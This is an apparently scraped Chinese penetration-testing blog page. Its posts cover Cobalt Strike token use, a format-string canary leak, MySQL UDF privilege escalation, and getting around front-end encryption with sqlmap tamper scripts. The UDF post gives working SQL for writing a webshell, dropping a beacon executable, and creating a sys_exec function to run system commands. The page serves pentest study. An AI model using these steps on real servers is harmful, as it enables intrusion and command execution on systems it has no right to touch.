<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help make_token</span><br><span class="line">Use: make_token [DOMAIN\user] [password]</span><br><span class="line"></span><br><span class="line">Clone the current access token <span class="keyword">and</span> <span class="builtin-name">set</span> it up <span class="keyword">to</span> pass the specified username</span><br><span class="line"><span class="keyword">and</span> password when you interact with<span class="built_in"> network </span>resources. This command does <span class="keyword">not</span></span><br><span class="line">validate the credentials you provide <span class="keyword">and</span> it has <span class="literal">no</span> effect on local actions.</span><br><span class="line">eg:</span><br><span class="line">make_toke x51.test\administrator password4administrator</span><br></pre></td></tr></table></figure>

<p>cobaltstrike官方博客介绍</p>
<h4 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h4></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-02-26T09:10:28.000Z" title="2019-02-26T09:10:28.000Z">2019-02-26</time><span class="level-item"> XSL </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/02/26/%E6%B8%A9%E6%95%85%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2leak-canary/">温故——格式化字符串Leak Canary</a></h1><div class="content"><h6 id="PWN入门笔记"><a href="#PWN入门笔记" class="headerlink" title="PWN入门笔记"></a>PWN入门笔记</h6><p>main函数开启canary时栈分布： </p>
<p>当堆栈向下(低地址)增长时，以FP地址（EBP）为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值</p>
<p><img src="/images/pasted-35.png" alt="upload successful"></p>
<p><img src="/images/pasted-29.png" alt="upload successful"><br>在程序结束处寻找canary的值：</p>
<p><img src="/images/pasted-36.png" alt="upload successful"></p>
<p>详细过程：</p>
<p><img src="/images/pasted-31.png" alt="upload successful"></p>
<p><img src="/images/pasted-32.png" alt="upload successful"><br>此时edx的值即canary的值：</p>
<p><img src="/images/pasted-33.png" alt="upload successful"><br>计算偏移：</p>
<p><img src="/images/pasted-34.png" alt="upload successful"></p>
<p>读取：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./binary_200  </span></span><br><span class="line">%15$x</span><br><span class="line">f1339a0<span class="number">0</span></span><br></pre></td></tr></table></figure></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-02-26T01:23:04.000Z" title="2019-02-26T01:23:04.000Z">2019-02-26</time><span class="level-item"> XSL </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/02/26/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/">博客迁移记录</a></h1><div class="content"><p>update：2019-05-13</p>
<p>删除live2d插件；</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">npm</span> <span class="string">uninstall hexo-helper-live2d</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br></pre></td></tr></table></figure>

<p>update：2019-02-26</p>
<p>配置新环境：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"yourgithubname"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"yourgithubemail"</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br><span class="line">cat .ssh/xxx.pub (配置到github账户上)</span><br><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Using Ubuntu</span></span><br><span class="line">curl -sL https:<span class="comment">//deb.nodesource.com/setup_10.x | sudo -E bash -</span></span><br><span class="line">sudo apt-<span class="keyword">get</span> install -y nodejs</span><br></pre></td></tr></table></figure>
<p>注：网上教程大部分是直接用apt安装nodejs，实测在ubuntu18.04x64系统下会失败。</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure>
<p>博客备份目录下执行：<code>npm install</code></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-02-23T01:03:53.000Z" title="2019-02-23T01:03:53.000Z">2019-02-23</time><span class="level-item"> xsl </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/02/23/%E6%B8%A9%E6%95%85%E2%80%94%E2%80%94MySQL%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E6%8F%90%E6%9D%83/">温故——MySQL数据库UDF提权</a></h1><div class="content"><p>update：2019-05-13</p>
<p>遇到一个案例，在内网扫描到MySQL弱口令（root账户），连接数据库后将beacon以16进制的形式写入到指定目录（目录可通过sqlmap os-shell获得），可在本地MySQL执行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'/root/beacon.exe'</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'root/beacon.txt'</span>;</span><br></pre></td></tr></table></figure>
<p>然后在目标MySQL执行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0</span>x&#123;beacon.txt&#125; <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\path\\beacon.exe'</span>;</span><br></pre></td></tr></table></figure>
<p>最后在sqlmap的os-shell上运行beacon即可；</p>
<p>注：通过该方法写入hex数据时注意路径正确，写入文件不易过大，耗时较久；</p>
<p>使用sqlmap也可以实现udf提权，在一定情况下可选；</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d <span class="string">"mysql://user:pass@192.168.0.1:3306/testdb"</span> --os-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
<p>通过执行记录可看到仍然是上传dll文件后创建sys_evel和sys_exec函数来执行系统命令；</p>
<p>======================</p>
<p>一个PHP站点，安装了phpmyadmin，root口令已拿到，首先想到的是写shell，然后看webshell权限情况是否需要提权。<br>数据库一些基本参数：<br><img src="/images/pasted-15.png" alt="upload successful"><br>默认安装位置在C盘program files路径（这个路径普通权限无法写入，后续提权会遇到），猜测网站路径也应该是默认部署，即C:/intpub/wwwroot/，可直接向这个路径写文件验证一下，不过后来手工试了一下phpinfo存在，验证路径正确。</p>
<p><img src="/images/pasted-16.png" alt="upload successful"><br>贴一张mysql文件操作的笔记：<br><img src="/images/pasted-19.png" alt="upload successful"><br>写webshell：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">"..."</span> intofile <span class="string">"C:/intpub/wwwroot/shell.php"</span>;</span><br></pre></td></tr></table></figure>
<p>此处需注意路径中“/”或者“\\”才可以，不要直接复制phpinfo中的“\”。<br>看一下webshell权限：<br><img src="/images/pasted-18.png" alt="upload successful"><br>（SeImpersonatePrivilege开启，看了下端口开放情况应当可以用另一种方法提权，暂且放置）</p>
<h6 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h6><p>UDF即用户自定义函数，一个包含执行函数的动态链接库，这个dll文件（Windows环境）在SQLMAP安装目录有，x86和x64环境各一份 ：<br><img src="/images/pasted-20.png" alt="upload successful"><br>需要先做一下解码操作：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/</span>extra<span class="regexp">/cloak/</span>cloak.py -d -i <span class="regexp">/usr/</span>share<span class="regexp">/sqlmap/u</span>df<span class="regexp">/mysql/</span>windows<span class="regexp">/32/</span>lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure>
<p>会在同目录生成一份可用dll文件</p>
<p><img src="/images/pasted-21.png" alt="upload successful"><br>关于选择平台位数的问题，需要在MySQL中确认：</p>
<p><img src="/images/pasted-22.png" alt="upload successful"><br>这儿要以version_compile_os为准，选64位的dll。<br>如果选择错误会报如下错误：</p>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<p>准备好udf64.dll文件之后，上传目录也需要选择正确的路径：<br>1、MySQL&gt;5.1，需要放置在mysql安装目录下的plugin文件夹；<br>2、MySQL&lt;5.1，需要放置在system32目录下<br>查看plugin完整路径：<br><img src="/images/pasted-24.png" alt="upload successful"><br>该目录webshell没有写权限，利用MySQL的load_file函数  </p>
<p><img src="/images/pasted-25.png" alt="upload successful"><br>创建函数sys_exec：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">"udf64"</span>;</span><br></pre></td></tr></table></figure>
<p>创建成功之后即可直接select sys_exec来使用；</p>
<p><img src="/images/pasted-26.png" alt="upload successful"><br>测试完成之后删除函数，删除dll文件；</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_exec;</span><br></pre></td></tr></table></figure></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-02-14T08:32:48.000Z" title="2019-02-14T08:32:48.000Z">2019-02-14</time><span class="level-item"> xsl </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/02/14/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/">安全测试中如何处理前端加密？</a></h1><div class="content"><p>在渗透测试过程中难免会遇到很多参数前端加密处理的情况，对我们接下来Fuzz、爆破/注入等操作引入很多麻烦，结合之前遇到的几种场景，整理总结了以下解决方法，常见场景如：<br>1、遇到一个SQL注入，但是注入参数被魔改base64了，我们需要写tamper处理payload，如何高效处理？<br>2、请求带一个防重放攻击的校验hash，该hash是开发者自定义加密算法生成的，如何分析并达到批量目的？<br>3、…</p>
<h4 id="1、execjs"><a href="#1、execjs" class="headerlink" title="1、execjs"></a>1、execjs</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> execjs</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>execjs.eval(<span class="string">"'red yellow blue'.split(' ')"</span>)</span><br><span class="line">[<span class="string">'red'</span>, <span class="string">'yellow'</span>, <span class="string">'blue'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ctx = execjs.compile(<span class="string">"""</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    function add(x, y) &#123;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        return x + y;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &#125;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>"""</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ctx.call(<span class="string">"add"</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>某些情况下用execjs不可以直接调用，会报一个无效变量的错误，猜测应该是js文件中使用了匿名函数的原因？需要手工处理一下js代码，具体技术细节未深入了解。</p>
<h4 id="2、Selenium"><a href="#2、Selenium" class="headerlink" title="2、Selenium"></a>2、Selenium</h4><p>常见的高级爬虫环境Python + Selenium + ChromeDriver，基本上浏览器能做的它都可以做（其实就是一个浏览器…）,环境配置也比较简单，于是写了个简单的验证程序：</p>
<p><img src="/images/pasted-7.png" alt="upload successful"></p>
<p>看起来有点笨重，也有点大材小用的感觉。</p>
<h4 id="3、js2py"><a href="#3、js2py" class="headerlink" title="3、js2py"></a>3、js2py</h4><p>顾名思义，js代码转python代码，官方的介绍：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaScript to Python Translator &amp; JavaScript <span class="built_in">int</span>erpreter written <span class="keyword">in</span> <span class="number">100</span>% pure Python</span><br></pre></td></tr></table></figure>


<p>把负责加密的js扒下来，转为可用的python代码：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will translate example.js to example.py</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; js2py.translate_file(<span class="string">'example.js'</span>, <span class="string">'example.py'</span>)</span><br><span class="line"><span class="comment"># example.py can be now imported and used!</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; from example import example</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; example.someFunction()</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>转换结果形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> js2py.pyjs <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># setting scope</span></span><br><span class="line">var = Scope( JS_BUILTINS )</span><br><span class="line">set_global_object(var)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Code follows:</span></span><br><span class="line">var.registers([<span class="string">u'$'</span>])</span><br><span class="line"><span class="meta">@Js</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PyJsHoistedNonPyName</span><span class="params">(x, this, arguments, var=var)</span>:</span></span><br><span class="line">    var = Scope(&#123;<span class="string">u'this'</span>:this, <span class="string">u'x'</span>:x, <span class="string">u'arguments'</span>:arguments&#125;, var)</span><br><span class="line">    var.registers([<span class="string">u'x'</span>])</span><br><span class="line">    var.get(<span class="string">u'console'</span>).callprop(<span class="string">u'log'</span>, var.get(<span class="string">u'x'</span>))</span><br><span class="line">PyJsHoistedNonPyName.func_name = <span class="string">u'$'</span></span><br><span class="line">var.put(<span class="string">u'$'</span>, PyJsHoistedNonPyName)</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">var.get(<span class="string">u'$'</span>)(Js(<span class="string">u'Hello, World!'</span>))</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>直接导入即可调用：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"></span><br><span class="line">from <span class="class"><span class="keyword">lib</span>.<span class="title">core</span>.<span class="title">enums</span> <span class="title">import</span> <span class="title">PRIORITY</span></span></span><br><span class="line">from jsfile import jsfile</span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span></span>():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span></span>(payload, **kwargs):</span><br><span class="line">    <span class="keyword">return</span> jsfile.encMe(payload)</span><br></pre></td></tr></table></figure>
<p>jsfile是js2py.translate_file的结果。</p>
<h4 id="4、jsEncrypter"><a href="#4、jsEncrypter" class="headerlink" title="4、jsEncrypter"></a>4、jsEncrypter</h4><p>jsEncrypter 是一个处理前端加密非常好用的burp suite插件，该插件使用phantomjs启动前端加密函数对数据进行加密，方便对加密数据输入点进行fuzz，比如可以使用于前端加密传输爆破等场景。<br>GitHub：<a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a><br>详细使用方法参考项目主页，用法比较简单，作者给出一个phantomjs模板：  </p>
<pre><code>...
/* 1.在这引入实现加密所有js文件,注意引入顺序和网页一致 */
loadScript(&quot;script-1.js&quot;);
loadScript(&quot;script-2.js&quot;);
loadScript(&quot;script-n.js&quot;);
/**********************************************/

...

function jsEncrypt(burp_payload){
    var new_payload;
    /* 2.在这里编写调用加密函数进行加密的代码,并把结果赋值给new_payload */

    /*********************************************************/
    return new_payload;
}
...  </code></pre><p>第一步从网站前端扒下来包含加密核心代码的js文件，在phantomjs模板文件中引入；<br>第二部处理jsEncrypt函数返回，运行<code>phantomJS.exe encrypt.js</code>，开启插件即可；</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Burp suite插件能解决的问题首选jsencrypter，如果需要写脚本处理，比如sqlmap的tamper，选js2py！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-02-11T22:16:00.000Z" title="2019-02-11T22:16:00.000Z">2019-02-11</time></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/02/11/cobalt-strike-study/">Cobalt Strike学习遇到的问题</a></h1><div class="content"><p>jad处理class的结果和jd-gui这类工具反编译结果不太一样，cobaltstrike.jar中的同一个class文件结果如下：</p>
<p><img src="/images/pasted-1.png" alt="upload successful"></p>
<p>回编的时候会报一些奇怪的错误，需要结合jd-gui和jad两者的结果做适当修改，以AggressorClient文件为例：</p>
<p><img src="/images/pasted-3.png" alt="upload successful"></p>
<p><img src="/images/pasted-4.png" alt="upload successful"></p>
<p>定位到178行：</p>
<p><img src="/images/pasted-5.png" alt="upload successful"></p>
<p>尝试将这段for循环替换了一下，不再报错,重新打包后运行正常，修改结果也成功验证。</p>
<p><img src="/images/pasted-6.png" alt="upload successful"></p>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-05-13T14:16:20.000Z">2020-05-13</time></p><p class="title is-6"><a class="link-muted" href="/2020/05/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/">微信小程序测试</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-04-21T06:45:54.000Z">2020-04-21</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/21/%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%A6%99%E7%94%A8/">钉钉机器人妙用</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-01-26T13:06:00.000Z">2020-01-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/01/26/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97/">Android客户端安全测试系列</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-01-16T09:34:27.000Z">2020-01-16</time></p><p class="title is-6"><a class="link-muted" href="/2020/01/16/Struts2%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8FGolang%E7%89%88/">Struts2全漏洞扫描Golang版</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-01-07T03:19:17.000Z">2020-01-07</time></p><p class="title is-6"><a class="link-muted" href="/2020/01/07/Pentestit-Lab-14-Writeup-Walkthrough/">Pentestit Lab 14 Writeup/Walkthrough</a></p><p class="is-uppercase"></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/07/"><span class="level-start"><span class="level-item">七月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/05/"><span class="level-start"><span class="level-item">五月 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/02/"><span class="level-start"><span class="level-item">二月 2019</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="x51"></figure><p class="title is-size-4 is-block line-height-inherit">x51</p><p class="is-size-6 is-block">暂无介绍</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">15</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/x51" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/x51"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">x51</a><p class="size-small"><span>&copy; 2020 x51</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'https://utf32.com',
                external_link: {"enable":false,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>